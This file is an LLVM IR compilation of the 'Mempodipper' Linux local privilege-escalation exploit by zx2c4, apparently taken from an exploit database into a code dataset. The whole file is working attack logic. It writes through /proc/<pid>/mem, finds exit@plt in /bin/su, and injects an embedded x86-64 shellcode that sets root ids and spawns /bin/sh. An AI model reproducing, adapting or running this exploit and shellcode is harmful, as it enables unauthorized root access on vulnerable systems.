; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_18411.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_18411.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [13 x i8] c"/proc/%s/mem\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c"[+] Opening parent mem %s in child.\0A\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [9 x i8] c"[-] open\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"[+] Sending fd %d to parent.\0A\00", align 1
@.str.4 = private unnamed_addr constant [33 x i8] c"===============================\0A\00", align 1
@.str.5 = private unnamed_addr constant [33 x i8] c"=          Mempodipper        =\0A\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"=           by zx2c4          =\0A\00", align 1
@.str.7 = private unnamed_addr constant [33 x i8] c"=         Jan 21, 2012        =\0A\00", align 1
@.str.8 = private unnamed_addr constant [34 x i8] c"===============================\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [43 x i8] c"[+] Waiting for transferred fd in parent.\0A\00", align 1
@.str.10 = private unnamed_addr constant [24 x i8] c"[+] Received fd at %d.\0A\00", align 1
@.str.11 = private unnamed_addr constant [12 x i8] c"[-] recv_fd\00", align 1
@.str.12 = private unnamed_addr constant [32 x i8] c"[+] Assigning fd %d to stderr.\0A\00", align 1
@.str.13 = private unnamed_addr constant [30 x i8] c"[+] Reading su for exit@plt.\0A\00", align 1
@.str.14 = private unnamed_addr constant [90 x i8] c"objdump -d /bin/su|grep 'exit@plt'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'\00", align 1
@.str.15 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@ULONG_MAX = common dso_local global i64 0, align 8
@.str.16 = private unnamed_addr constant [80 x i8] c"[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\0A\00", align 1
@.str.17 = private unnamed_addr constant [54 x i8] c"[-] Usage: %s -o ADDRESS\0A[-] Example: %s -o 0x402178\0A\00", align 1
@.str.18 = private unnamed_addr constant [33 x i8] c"[+] Resolved exit@plt to 0x%lx.\0A\00", align 1
@.str.19 = private unnamed_addr constant [29 x i8] c"[+] Calculating su padding.\0A\00", align 1
@.str.20 = private unnamed_addr constant [33 x i8] c"su this-user-does-not-exist 2>&1\00", align 1
@.str.21 = private unnamed_addr constant [25 x i8] c"this-user-does-not-exist\00", align 1
@.str.22 = private unnamed_addr constant [30 x i8] c"[+] Seeking to offset 0x%lx.\0A\00", align 1
@SEEK_SET = common dso_local global i32 0, align 4
@__const.main.shellcode = private unnamed_addr constant [70 x i8] c"H1\FF\B0i\0F\05H1\FF\B0j\0F\05@\B7\06@\B6\02\B0!\0F\05H\BB//bin/shH\C1\EB\08SH\89\E7H1\DBf\BB-iSH\89\E1H1\C0PQWH\89\E6H1\D2\B0;\0F\05\00", align 16
@.str.23 = private unnamed_addr constant [34 x i8] c"[+] Executing su with shellcode.\0A\00", align 1
@.str.24 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"su\00", align 1
@.str.26 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.27 = private unnamed_addr constant [38 x i8] c"[+] Executing child from child fork.\0A\00", align 1
@.str.28 = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@.str.29 = private unnamed_addr constant [3 x i8] c"-c\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [256 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i32*, align 8
  %12 = alloca [32 x i8], align 16
  %13 = alloca i32*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca i64, align 8
  %16 = alloca i64, align 8
  %17 = alloca [70 x i8], align 16
  %18 = alloca [32 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 2
  br i1 %20, label %21, label %57

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 0
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = icmp eq i32 %27, 45
  br i1 %28, label %29, label %57

29:                                               ; preds = %21
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 1
  %32 = load i8*, i8** %31, align 8
  %33 = getelementptr inbounds i8, i8* %32, i64 1
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 99
  br i1 %36, label %37, label %57

37:                                               ; preds = %29
  %38 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 2
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %38, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i8* %41)
  %43 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0), i8* %43)
  %45 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %46 = load i32, i32* @O_RDWR, align 4
  %47 = call i32 @open(i8* %45, i32 %46)
  store i32 %47, i32* %7, align 4
  %48 = load i32, i32* %7, align 4
  %49 = icmp slt i32 %48, 0
  br i1 %49, label %50, label %52

50:                                               ; preds = %37
  %51 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %172

52:                                               ; preds = %37
  %53 = load i32, i32* %7, align 4
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i32 %53)
  %55 = load i32, i32* %7, align 4
  %56 = call i32 @send_fd(i32 %55)
  store i32 0, i32* %3, align 4
  br label %172

57:                                               ; preds = %29, %21, %2
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.4, i64 0, i64 0))
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0))
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0))
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.7, i64 0, i64 0))
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.8, i64 0, i64 0))
  %63 = call i32 (...) @getpid()
  store i32 %63, i32* %8, align 4
  %64 = call i64 (...) @fork()
  %65 = icmp ne i64 %64, 0
  br i1 %65, label %66, label %162

66:                                               ; preds = %57
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.9, i64 0, i64 0))
  %68 = call i32 (...) @recv_fd()
  store i32 %68, i32* %9, align 4
  %69 = load i32, i32* %9, align 4
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.10, i64 0, i64 0), i32 %69)
  %71 = load i32, i32* %9, align 4
  %72 = icmp slt i32 %71, 0
  br i1 %72, label %73, label %75

73:                                               ; preds = %66
  %74 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.11, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %172

75:                                               ; preds = %66
  %76 = load i32, i32* %9, align 4
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.12, i64 0, i64 0), i32 %76)
  %78 = call i32 @dup2(i32 2, i32 6)
  %79 = load i32, i32* %9, align 4
  %80 = call i32 @dup2(i32 %79, i32 2)
  %81 = load i32, i32* %4, align 4
  %82 = icmp sgt i32 %81, 2
  br i1 %82, label %83, label %104

83:                                               ; preds = %75
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = getelementptr inbounds i8, i8* %86, i64 0
  %88 = load i8, i8* %87, align 1
  %89 = sext i8 %88 to i32
  %90 = icmp eq i32 %89, 45
  br i1 %90, label %91, label %104

91:                                               ; preds = %83
  %92 = load i8**, i8*** %5, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 1
  %94 = load i8*, i8** %93, align 8
  %95 = getelementptr inbounds i8, i8* %94, i64 1
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %97, 111
  br i1 %98, label %99, label %104

99:                                               ; preds = %91
  %100 = load i8**, i8*** %5, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 2
  %102 = load i8*, i8** %101, align 8
  %103 = call i64 @strtoul(i8* %102, i32* null, i32 16)
  store i64 %103, i64* %10, align 8
  br label %133

104:                                              ; preds = %91, %83, %75
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.13, i64 0, i64 0))
  %106 = call i32* @popen(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store i32* %106, i32** %11, align 8
  %107 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  store i8 0, i8* %107, align 16
  %108 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  %109 = load i32*, i32** %11, align 8
  %110 = call i32 @fgets(i8* %108, i32 32, i32* %109)
  %111 = load i32*, i32** %11, align 8
  %112 = call i32 @pclose(i32* %111)
  %113 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  %114 = call i64 @strtoul(i8* %113, i32* null, i32 16)
  store i64 %114, i64* %10, align 8
  %115 = load i64, i64* %10, align 8
  %116 = load i64, i64* @ULONG_MAX, align 8
  %117 = icmp eq i64 %115, %116
  br i1 %117, label %121, label %118

118:                                              ; preds = %104
  %119 = load i64, i64* %10, align 8
  %120 = icmp ne i64 %119, 0
  br i1 %120, label %130, label %121

121:                                              ; preds = %118, %104
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.16, i64 0, i64 0))
  %123 = load i8**, i8*** %5, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 0
  %125 = load i8*, i8** %124, align 8
  %126 = load i8**, i8*** %5, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 0
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.17, i64 0, i64 0), i8* %125, i8* %128)
  store i32 1, i32* %3, align 4
  br label %172

130:                                              ; preds = %118
  %131 = load i64, i64* %10, align 8
  %132 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.18, i64 0, i64 0), i64 %131)
  br label %133

133:                                              ; preds = %130, %99
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.19, i64 0, i64 0))
  %135 = call i32* @popen(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store i32* %135, i32** %13, align 8
  %136 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  store i8 0, i8* %136, align 16
  %137 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %138 = load i32*, i32** %13, align 8
  %139 = call i32 @fgets(i8* %137, i32 256, i32* %138)
  %140 = load i32*, i32** %13, align 8
  %141 = call i32 @pclose(i32* %140)
  %142 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %143 = call i8* @strstr(i8* %142, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.21, i64 0, i64 0))
  %144 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i64 0, i64 0
  %145 = ptrtoint i8* %143 to i64
  %146 = ptrtoint i8* %144 to i64
  %147 = sub i64 %145, %146
  %148 = udiv i64 %147, 1
  store i64 %148, i64* %15, align 8
  %149 = load i64, i64* %10, align 8
  %150 = load i64, i64* %15, align 8
  %151 = sub i64 %149, %150
  store i64 %151, i64* %16, align 8
  %152 = load i64, i64* %16, align 8
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.22, i64 0, i64 0), i64 %152)
  %154 = load i32, i32* %9, align 4
  %155 = load i64, i64* %16, align 8
  %156 = load i32, i32* @SEEK_SET, align 4
  %157 = call i32 @lseek64(i32 %154, i64 %155, i32 %156)
  %158 = bitcast [70 x i8]* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %158, i8* align 16 getelementptr inbounds ([70 x i8], [70 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 70, i1 false)
  %159 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.23, i64 0, i64 0))
  %160 = getelementptr inbounds [70 x i8], [70 x i8]* %17, i64 0, i64 0
  %161 = call i32 (i8*, i8*, i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.24, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i64 0, i64 0), i8* %160, i8* null)
  br label %172

162:                                              ; preds = %57
  %163 = getelementptr inbounds [32 x i8], [32 x i8]* %18, i64 0, i64 0
  %164 = load i32, i32* %8, align 4
  %165 = call i32 (i8*, i8*, ...) @sprintf(i8* %163, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.26, i64 0, i64 0), i32 %164)
  %166 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.27, i64 0, i64 0))
  %167 = load i8**, i8*** %5, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 0
  %169 = load i8*, i8** %168, align 8
  %170 = getelementptr inbounds [32 x i8], [32 x i8]* %18, i64 0, i64 0
  %171 = call i32 (i8*, i8*, i8*, i8*, ...) @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.28, i64 0, i64 0), i8* %169, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i64 0, i64 0), i8* %170, i8* null)
  br label %172

172:                                              ; preds = %50, %52, %73, %121, %162, %133
  %173 = load i32, i32* %3, align 4
  ret i32 %173
}

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @send_fd(i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @recv_fd(...) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i64 @strtoul(i8*, i32*, i32) #1

declare dso_local i32* @popen(i8*, i8*) #1

declare dso_local i32 @fgets(i8*, i32, i32*) #1

declare dso_local i32 @pclose(i32*) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32 @lseek64(i32, i64, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
